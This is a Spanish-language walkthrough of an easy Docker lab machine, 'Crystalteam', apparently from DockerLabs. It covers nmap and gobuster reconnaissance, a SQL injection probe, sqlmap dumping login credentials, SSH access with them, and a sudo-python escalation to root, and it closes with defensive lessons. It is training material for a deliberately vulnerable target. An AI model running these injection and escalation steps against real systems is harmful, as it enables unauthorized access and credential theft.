# 🖥️ **Máquina: Crystalteam**  
🔹 **Dificultad:** Fácil  
📌 **Descripción:**  
Crystalteam es una máquina vulnerable basada en Docker, diseñada para poner a prueba habilidades en la explotación de bases de datos mediante **inyecciones SQL (SQLi)**. Su enfoque principal es la identificación y explotación de vulnerabilidades en consultas MySQL para obtener acceso no autorizado a la base de datos y extraer información sensible.  

📢 **Agradecimientos:** Gracias a [DockerLabs](https://dockerlabs.es) por proporcionar *scripts* y bases que facilitaron la creación de esta máquina.  

---

## 🎯 **Objetivo**  
- Identificar y explotar fallos de seguridad en la página web **Certificación** mediante **inyección SQL**.  
- Comprender el impacto real de estas vulnerabilidades y cómo prevenirlas.  

---

## 🚀 **Despliegue de la Máquina Backend en DockerLabs**  

### 1️⃣ **Descargar el Archivo**  
Descarga el archivo desde el siguiente enlace:  

🔗 [Crystalteam Docker Machine](https://drive.google.com/drive/folders/1rmXS7t-rqtLrRHcFd15-Sv8ujptn4fpT?usp=sharing)  

### 2️⃣ **Ejecutar el Despliegue Automático**  
Ejecuta el siguiente comando para desplegar la máquina en Docker:  

```bash
bash auto_deploy.sh crystalteam.tar
```
Una vez iniciada, comprueba la conexión con:  

```bash
ping -c4 172.17.0.2
```

![Máquina Backend](/Img/Docker.jpeg)

### 3️⃣ **Reconocimiento Inicial con Nmap**  
Realizamos un escaneo de puertos con:  

```bash
nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Extraemos los puertos abiertos con:  

```bash
extracPorts allPorts.txt
```

Luego, realizamos un análisis detallado de los servicios en ejecución:  

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN target
```

📌 **Resultado:** Identificamos el puerto **22 (SSH)** y el **80 (HTTP)**, lo que nos sugiere que hay un sitio web corriendo.  

![Máquina Backend](/Img/Puertos.jpeg)

---

## 🔍 **Enumeración del Sitio Web**  

Editamos el archivo de *hosts* para facilitar el acceso:  

```bash
nano /etc/hosts
```

Recopilamos información con **WhatWeb** para detectar tecnologías usadas:  

```bash
whatweb 172.17.0.2
```

![Máquina Backend](/Img/whatweb.jpeg)

Al ingresar a la página web, encontramos un **formulario de inicio de sesión y registro**.  

![Máquina Backend](/Img/index.jpeg)  

![Máquina Backend](/Img/ad.jpeg)  

Para descubrir directorios ocultos, utilizamos **Gobuster**:  

```bash
gobuster dir -u http://172.17.0.2/Certificacion -w /usr/share/seclists/Discovery/web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt
```

Para buscar subdominios:  

```bash
gobuster vhost -u http://172.17.0.2/Certificacion -w /usr/share/seclists/Discovery/web-Content/directory-list-2.3-medium.txt -t 20 | grep -v "402"
```

📌 **Resultado:** No se encontraron subdominios o directorios relevantes.  

![Máquina Backend](/Img/domi.jpeg)  

![Máquina Backend](/Img/php.jpeg)  

---

## 🔥 **Explotación - Inyección SQL**  

Probamos inyección SQL en el campo de usuario con:  

```sql
admin'
```

📌 **Resultado:** Se genera un **error de base de datos**, confirmando la vulnerabilidad.  

![Máquina Backend](/Img/in.jpeg)  

![Máquina Backend](/Img/error.jpeg)  

Usamos **Burp Suite** para interceptar la solicitud y guardarla en un archivo `.req`.  

Ejecutamos **SQLMap** para extraer datos sensibles:  

```bash
sqlmap -r peticione.req --level=5 --risk=3 --dump
```

![Máquina Backend](/Img/sql.jpeg)  

📌 **Resultado:** Encontramos una base de datos llamada **inicio**, con nombres de usuario y contraseñas.  

![Máquina Backend](/Img/Tabla.jpeg)  

Usamos las credenciales para intentar acceder por **SSH**:  

```bash
ssh alejandro@172.17.0.2 -p 22
```

📌 **Acceso concedido como usuario "alejandro".**  

![Máquina Backend](/Img/ssh.jpeg)  

---

## 🚀 **Escalada de Privilegios**  

Listamos permisos con:  

```bash
sudo -l | grep python
```

📌 **Resultado:** Python puede ejecutar comandos como **root**.  

Ejecutamos el siguiente comando para leer el archivo `redflag.txt`:  

```bash
sudo python3 -c "print(open('redflag.txt').read())"
```

![Máquina Backend](/Img/root.jpeg)  

📌 **Resultado:** ¡Hemos obtenido la *redflag*! 🎉  

Para verificar acceso como *root*, ejecutamos:  

```bash
su -
```

![Máquina Backend](/Img/ter.jpeg)  

📌 **Resultado:** **Acceso total a la máquina.**  

---

## 🏆 **Conclusión**  

🔹 **Vulnerabilidades explotadas:**  
✅ Inyección SQL (SQLi) para obtener credenciales.  
✅ Uso de credenciales expuestas para acceder por SSH.  
✅ Escalada de privilegios mediante Python.  

🔹 **Lecciones aprendidas:**  
🚨 **No** concatenar consultas SQL sin sanitizar entradas.  
🔐 Implementar **hashing de contraseñas** en la base de datos.  
📛 Restringir permisos innecesarios a usuarios del sistema.  

💡 **¿Te gustaría probar esta máquina?** Descárgala y cuéntame tu experiencia. 🚀  

